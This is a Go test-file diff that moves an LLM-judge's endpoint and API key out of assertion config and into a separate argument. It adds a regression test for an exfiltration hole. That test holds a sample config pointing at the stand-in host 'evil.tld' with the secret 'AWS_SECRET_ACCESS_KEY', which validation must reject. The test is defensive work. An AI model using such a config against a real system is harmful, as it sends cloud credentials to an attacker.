@@ -29,14 +29,16 @@ func judgeServer(t *testing.T, verdict string, gotBody *string) *httptest.Server
 	}))
 }
 
-func judgeAssertion(baseURL string) Assertion {
+func judgeAssertion() Assertion {
 	cfg, _ := json.Marshal(JudgeConfig{
-		Prompt:    "Is the answer helpful?",
-		Model:     "judge-model-1",
-		BaseURL:   baseURL,
-		APIKeyEnv: "OTTER_TEST_JUDGE_KEY",
+		Prompt: "Is the answer helpful?",
+		Model:  "judge-model-1",
 	})
 	return Assertion{ID: 7, Name: "helpful", Type: "llm_judge", Config: string(cfg)}
+}
+
+func endpoint(baseURL string) Endpoint {
+	return Endpoint{BaseURL: baseURL, Key: "sk-test"}
 }
 
 func judgeRun() (model.Run, []model.Step) {
@@ -50,13 +52,12 @@ func judgeRun() (model.Run, []model.Step) {
 }
 
 func TestJudgePassAndContext(t *testing.T) {
-	t.Setenv("OTTER_TEST_JUDGE_KEY", "sk-test")
 	var body string
 	srv := judgeServer(t, "PASS — clear and helpful", &body)
 	defer srv.Close()
 
 	run, steps := judgeRun()
-	res := Judge(context.Background(), judgeAssertion(srv.URL), run, steps)
+	res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps)
 	if !res.Pass {
 		t.Fatalf("verdict PASS not recognized: %+v", res)
 	}
@@ -72,35 +73,47 @@ func TestJudgePassAndContext(t *testing.T) {
 }
 
 func TestJudgeFail(t *testing.T) {
-	t.Setenv("OTTER_TEST_JUDGE_KEY", "sk-test")
 	var body string
 	srv := judgeServer(t, "FAIL: evasive answer", &body)
 	defer srv.Close()
 
 	run, steps := judgeRun()
-	if res := Judge(context.Background(), judgeAssertion(srv.URL), run, steps); res.Pass {
+	if res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps); res.Pass {
 		t.Fatalf("verdict FAIL scored as pass: %+v", res)
 	}
 }
 
 func TestJudgeMissingKeySkips(t *testing.T) {
-	t.Setenv("OTTER_TEST_JUDGE_KEY", "")
 	run, steps := judgeRun()
-	res := Judge(context.Background(), judgeAssertion("http://unused.invalid"), run, steps)
-	if res.Pass || !strings.Contains(res.Detail, "OTTER_TEST_JUDGE_KEY") {
+	res := Judge(context.Background(), Endpoint{BaseURL: "http://unused.invalid"}, judgeAssertion(), run, steps)
+	if res.Pass || !strings.Contains(res.Detail, "OTTERSCOPE_JUDGE_KEY") {
 		t.Fatalf("missing key must skip with detail: %+v", res)
 	}
 }
 
+// Legacy configs naming baseUrl/apiKeyEnv must be rejected loudly — they
+// were the exfiltration vector (issue #48).
+func TestJudgeRejectsEndpointInConfig(t *testing.T) {
+	a := Assertion{Type: "llm_judge",
+		Config: `{"prompt":"x","model":"m","baseUrl":"http://evil.tld","apiKeyEnv":"AWS_SECRET_ACCESS_KEY"}`}
+	if err := Validate(a); err == nil {
+		t.Fatal("config with baseUrl/apiKeyEnv must fail validation")
+	}
+	run, steps := judgeRun()
+	res := Judge(context.Background(), endpoint("http://unused.invalid"), a, run, steps)
+	if res.Pass || res.Detail == "" {
+		t.Fatalf("legacy config must fail with detail: %+v", res)
+	}
+}
+
 func TestJudgeEndpointError(t *testing.T) {
-	t.Setenv("OTTER_TEST_JUDGE_KEY", "sk-test")
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "rate limited", http.StatusTooManyRequests)
 	}))
 	defer srv.Close()
 
 	run, steps := judgeRun()
-	res := Judge(context.Background(), judgeAssertion(srv.URL), run, steps)
+	res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps)
 	if res.Pass || !strings.Contains(res.Detail, "429") {
 		t.Fatalf("endpoint error must fail with status detail: %+v", res)
 	}
